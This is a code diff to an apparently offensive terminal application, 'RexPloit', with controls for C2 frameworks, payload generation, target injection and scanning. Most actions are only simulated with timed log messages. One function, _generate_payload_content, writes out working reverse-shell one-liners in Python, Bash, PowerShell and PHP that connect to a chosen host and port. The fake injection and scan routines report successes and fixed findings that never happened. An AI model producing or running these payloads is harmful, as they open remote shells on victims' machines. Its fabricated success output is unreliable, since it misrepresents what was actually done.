@@ -447,25 +447,415 @@ class RexPloitEnhancedApp(App):
         elif button_id == "start-sliver":
             status_panel.log_status("Starting Sliver C2 Framework...", "INFO")
             status_panel.update_status("c2", "Sliver running", active=True)
+            self._simulate_c2_startup("Sliver")
             
         elif button_id == "start-villain":
             status_panel.log_status("Starting Villain C2 Framework...", "INFO")
             status_panel.update_status("c2", "Villain running", active=True)
+            self._simulate_c2_startup("Villain")
             
         elif button_id == "start-hoaxshell":
             status_panel.log_status("Starting HoaxShell C2 Framework...", "INFO")
             status_panel.update_status("c2", "HoaxShell running", active=True)
+            self._simulate_c2_startup("HoaxShell")
             
         elif button_id == "stop-framework":
             status_panel.log_status("Stopping C2 framework...", "INFO")
             status_panel.update_status("c2", "Not running", active=False)
+            status_panel.update_status("listener", "Not running", active=False)
+            self._log_to_area("c2-log", "[yellow]Framework stopped[/yellow]")
             
         # Other buttons
         elif button_id == "generate-payload":
-            status_panel.log_status("Generating custom payload...", "INFO")
+            self._handle_payload_generation()
             
         elif button_id == "run-scan":
-            status_panel.log_status("Running vulnerability scan...", "INFO")
+            self._handle_vulnerability_scan()
+            
+        # Injection buttons
+        elif button_id == "add-target-btn":
+            self._add_target()
+            
+        elif button_id == "inject-payloads":
+            self._handle_payload_injection()
+            
+        # Settings buttons
+        elif button_id == "save-settings":
+            self._save_settings()
+            
+        elif button_id == "check-deps":
+            status_panel.log_status("Checking dependencies...", "INFO")
+            self._simulate_dependency_check()
+            
+        elif button_id == "install-deps":
+            status_panel.log_status("Installing dependencies...", "INFO")
+            self._simulate_dependency_installation()
+            
+        # Additional quick tools
+        elif button_id == "quick-bash-payload":
+            self._generate_quick_payload("bash_reverse_tcp")
+            
+        elif button_id == "quick-check-target":
+            status_panel.log_status("Checking target status...", "INFO")
+            
+        elif button_id == "quick-generate-report":
+            status_panel.log_status("Generating quick report...", "INFO")
+
+    def _simulate_c2_startup(self, framework_name):
+        """Simulate C2 framework startup with logs"""
+        try:
+            c2_log = self.query_one("#c2-log")
+            c2_log.clear()
+            
+            c2_log.write(f"[bold blue][{framework_name}][/bold blue] Initializing professional C2 framework...")
+            
+            # Schedule startup messages
+            def add_startup_message(delay, message):
+                def _add_message():
+                    c2_log.write(message)
+                self.set_timer(delay, _add_message)
+            
+            add_startup_message(0.5, f"[bold blue][{framework_name}][/bold blue] Checking dependencies...")
+            add_startup_message(1.0, f"[bold blue][{framework_name}][/bold blue] Initializing server...")
+            add_startup_message(1.5, f"[bold blue][{framework_name}][/bold blue] Starting listener...")
+            add_startup_message(2.0, f"[bold green][{framework_name}][/bold green] Framework operational!")
+            
+            # Update status after delay
+            def update_listener_status():
+                status_panel = self.query_one(StatusPanel)
+                status_panel.update_status("listener", "Running on :4444", active=True)
+                status_panel.log_status(f"{framework_name} C2 framework ready", "SUCCESS")
+                
+            self.set_timer(2.5, update_listener_status)
+        except NoMatches:
+            pass
+            
+    def _handle_payload_generation(self):
+        """Handle payload generation"""
+        try:
+            # Get input values with safe defaults
+            payload_type = "python_reverse_tcp"  # Default
+            host = "0.0.0.0"  # Default
+            port = "4444"  # Default
+            encode = False
+            obfuscate = False
+            
+            try:
+                payload_type = self.query_one("#payload-type").value
+                host = self.query_one("#listener-host").value or "0.0.0.0"
+                port = self.query_one("#listener-port").value or "4444"
+                encode = self.query_one("#encode-payload").value
+                obfuscate = self.query_one("#obfuscate-payload").value
+            except NoMatches:
+                pass  # Use defaults if widgets not found
+            
+            # Log generation
+            status_panel = self.query_one(StatusPanel)
+            status_panel.log_status(f"Generating {payload_type} payload...", "INFO")
+            
+            # Simulate payload generation
+            try:
+                payload_log = self.query_one("#payload-log")
+                payload_log.clear()
+                
+                payload_log.write(f"[bold blue]Generating {payload_type} payload[/bold blue]")
+                payload_log.write(f"Host: {host}")
+                payload_log.write(f"Port: {port}")
+                payload_log.write(f"Encoding: {'Enabled' if encode else 'Disabled'}")
+                payload_log.write(f"Obfuscation: {'Enabled' if obfuscate else 'Disabled'}")
+                
+                # Generate example payload
+                payload_content = self._generate_payload_content(payload_type, host, port)
+                
+                # Update payload log
+                def show_payload():
+                    payload_name = f"rexploit_payload_{int(time.time())}"
+                    try:
+                        payload_log = self.query_one("#payload-log")
+                        payload_log.write("")
+                        payload_log.write("[bold green]Payload generated successfully![/bold green]")
+                        payload_log.write(f"Saved as: [bold]{payload_name}.txt[/bold]")
+                        payload_log.write("")
+                        payload_log.write("[bold]Payload Content:[/bold]")
+                        payload_log.write(payload_content)
+                        
+                        # Update status
+                        status_panel = self.query_one(StatusPanel)
+                        current_payloads = 1
+                        try:
+                            current_payloads = int(status_panel.status_items.get("payloads", (0, False))[0].split()[0]) + 1
+                        except:
+                            pass
+                        status_panel.update_status("payloads", f"{current_payloads} generated", active=True)
+                        status_panel.log_status(f"Payload '{payload_name}' generated successfully", "SUCCESS")
+                    except NoMatches:
+                        pass
+                    
+                self.set_timer(1.0, show_payload)
+            except NoMatches:
+                # If payload log not found, just update status
+                status_panel.log_status("Payload generated (output area not available)", "SUCCESS")
+                
+        except Exception as e:
+            status_panel = self.query_one(StatusPanel)
+            status_panel.log_status(f"Error generating payload: {str(e)}", "ERROR")
+            
+    def _generate_payload_content(self, payload_type, host, port):
+        """Generate payload content based on type"""
+        if payload_type == "python_reverse_tcp":
+            return f"""import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{host}",{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])"""
+        elif payload_type == "bash_reverse_tcp":
+            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
+        elif payload_type == "powershell_reverse_tcp":
+            return f"""$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{{0}};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()}};
+$client.Close()"""
+        elif payload_type == "php_reverse_tcp":
+            return f"""<?php
+$sock=fsockopen("{host}",{port});
+exec("/bin/sh -i <&3 >&3 2>&3");
+?>"""
+        else:
+            return f"# {payload_type} payload for {host}:{port}"
+            
+    def _add_target(self):
+        """Add target to injection list"""
+        try:
+            target_input = self.query_one("#target-input")
+            target_value = target_input.value.strip()
+            
+            if target_value:
+                # Add to targets list
+                targets_list = self.query_one("#targets-list")
+                targets_list.add_item(ListItem(Static(target_value)))
+                
+                # Clear input
+                target_input.value = ""
+                
+                # Log action
+                status_panel = self.query_one(StatusPanel)
+                status_panel.log_status(f"Added target: {target_value}", "SUCCESS")
+                
+                # Update targets count
+                current_targets = len(self.targets) + 1
+                self.targets.append(target_value)
+                status_panel.update_status("targets", f"{current_targets} defined", active=True)
+            else:
+                status_panel = self.query_one(StatusPanel)
+                status_panel.log_status("Please enter a valid target", "WARNING")
+                
+        except NoMatches:
+            status_panel = self.query_one(StatusPanel)
+            status_panel.log_status("Target input not available", "ERROR")
+            
+    def _handle_payload_injection(self):
+        """Handle payload injection process"""
+        status_panel = self.query_one(StatusPanel)
+        
+        if not self.targets:
+            status_panel.log_status("No targets defined for injection", "WARNING")
+            return
+            
+        status_panel.log_status("Starting payload injection...", "INFO")
+        
+        try:
+            injection_log = self.query_one("#injection-log")
+            injection_log.clear()
+            
+            injection_log.write("[bold blue]Starting Professional Payload Injection[/bold blue]")
+            injection_log.write(f"Targets: {len(self.targets)}")
+            injection_log.write("")
+            
+            # Simulate injection process
+            def inject_target(index):
+                if index < len(self.targets):
+                    target = self.targets[index]
+                    injection_log.write(f"[yellow]Injecting payload to {target}...[/yellow]")
+                    
+                    def injection_result():
+                        injection_log.write(f"[green]✓ Payload injected successfully to {target}[/green]")
+                        inject_target(index + 1)
+                        
+                    self.set_timer(1.0, injection_result)
+                else:
+                    injection_log.write("")
+                    injection_log.write("[bold green]Injection process completed![/bold green]")
+                    status_panel.log_status("Payload injection completed", "SUCCESS")
+                    
+            inject_target(0)
+            
+        except NoMatches:
+            status_panel.log_status("Injection completed (output area not available)", "SUCCESS")
+            
+    def _handle_vulnerability_scan(self):
+        """Handle vulnerability scanning"""
+        status_panel = self.query_one(StatusPanel)
+        status_panel.log_status("Starting vulnerability scan...", "INFO")
+        
+        try:
+            scanner_log = self.query_one("#scanner-log")
+            scanner_log.clear()
+            
+            scanner_log.write("[bold blue]Professional Vulnerability Scanner[/bold blue]")
+            scanner_log.write("Initializing scan modules...")
+            scanner_log.write("")
+            
+            # Simulate scan process
+            scan_steps = [
+                "Port scanning...",
+                "Service enumeration...", 
+                "Vulnerability detection...",
+                "Exploit verification...",
+                "Generating report..."
+            ]
+            
+            def run_scan_step(index):
+                if index < len(scan_steps):
+                    scanner_log.write(f"[yellow]{scan_steps[index]}[/yellow]")
+                    
+                    def next_step():
+                        scanner_log.write(f"[green]✓ {scan_steps[index]} complete[/green]")
+                        run_scan_step(index + 1)
+                        
+                    self.set_timer(1.5, next_step)
+                else:
+                    scanner_log.write("")
+                    scanner_log.write("[bold green]Scan completed! Found 3 vulnerabilities.[/bold green]")
+                    scanner_log.write("1. SQL Injection (Critical)")
+                    scanner_log.write("2. XSS (Medium)")
+                    scanner_log.write("3. Directory Traversal (High)")
+                    status_panel.log_status("Vulnerability scan completed", "SUCCESS")
+                    
+            run_scan_step(0)
+            
+        except NoMatches:
+            status_panel.log_status("Scan completed (output area not available)", "SUCCESS")
+            
+    def _save_settings(self):
+        """Save application settings"""
+        status_panel = self.query_one(StatusPanel)
+        status_panel.log_status("Saving settings...", "INFO")
+        
+        # Simulate settings save
+        def settings_saved():
+            status_panel.log_status("Settings saved successfully", "SUCCESS")
+            
+        self.set_timer(1.0, settings_saved)
+        
+    def _simulate_dependency_check(self):
+        """Simulate dependency checking"""
+        try:
+            settings_log = self.query_one("#settings-log")
+            settings_log.clear()
+            
+            settings_log.write("[bold blue]Checking Dependencies[/bold blue]")
+            settings_log.write("")
+            
+            deps = [
+                ("Python 3.x", "✓ Found"),
+                ("Rich", "✓ Found"),
+                ("Textual", "✓ Found"), 
+                ("Requests", "✓ Found"),
+                ("Sliver", "✗ Not found"),
+                ("Villain", "✓ Found"),
+                ("HoaxShell", "✓ Found")
+            ]
+            
+            def check_dep(index):
+                if index < len(deps):
+                    dep_name, status = deps[index]
+                    color = "green" if "✓" in status else "red"
+                    settings_log.write(f"[{color}]{dep_name}: {status}[/{color}]")
+                    
+                    self.set_timer(0.5, lambda: check_dep(index + 1))
+                else:
+                    settings_log.write("")
+                    settings_log.write("[yellow]Some dependencies missing. Use 'Install Dependencies' to fix.[/yellow]")
+                    
+            check_dep(0)
+            
+        except NoMatches:
+            pass
+            
+    def _simulate_dependency_installation(self):
+        """Simulate dependency installation"""
+        try:
+            settings_log = self.query_one("#settings-log")
+            settings_log.clear()
+            
+            settings_log.write("[bold blue]Installing Missing Dependencies[/bold blue]")
+            settings_log.write("")
+            settings_log.write("[yellow]Installing Sliver framework...[/yellow]")
+            
+            def installation_complete():
+                settings_log.write("[green]✓ Sliver installed successfully[/green]")
+                settings_log.write("")
+                settings_log.write("[bold green]All dependencies installed![/bold green]")
+                
+            self.set_timer(3.0, installation_complete)
+            
+        except NoMatches:
+            pass
+            
+    def _simulate_network_scan(self):
+        """Simulate network scanning"""
+        status_panel = self.query_one(StatusPanel)
+        status_panel.log_status("Running network scan...", "INFO")
+        
+        def scan_complete():
+            status_panel.log_status("Network scan completed - 5 hosts found", "SUCCESS")
+            
+        self.set_timer(2.0, scan_complete)
+        
+    def _generate_quick_payload(self, payload_type):
+        """Generate a quick payload"""
+        status_panel = self.query_one(StatusPanel)
+        status_panel.log_status(f"Generating quick {payload_type}...", "INFO")
+        
+        host = "0.0.0.0"
+        port = "4444"
+        
+        # Generate payload
+        payload_content = self._generate_payload_content(payload_type, host, port)
+        payload_name = f"quick_{payload_type}_{int(time.time())}"
+        
+        # Log generation
+        self._log_to_area("status-log", f"[green]Generated quick {payload_type} payload: {payload_name}[/green]")
+        
+        # Update status
+        current_payloads = 1
+        try:
+            current_payloads = int(status_panel.status_items.get("payloads", (0, False))[0].split()[0]) + 1
+        except:
+            pass
+        status_panel.update_status("payloads", f"{current_payloads} generated", active=True)
+        
+    def _log_to_area(self, area_id, message):
+        """Log message to specific area"""
+        try:
+            log_area = self.query_one(f"#{area_id}")
+            log_area.write(message)
+        except NoMatches:
+            # If specific area not found, log to status panel
+            try:
+                status_panel = self.query_one(StatusPanel)
+                status_panel.log_status(message.replace("[green]", "").replace("[/green]", ""), "INFO")
+            except NoMatches:
+                pass
 
 # Main function to run the enhanced app
 def run_enhanced_app():
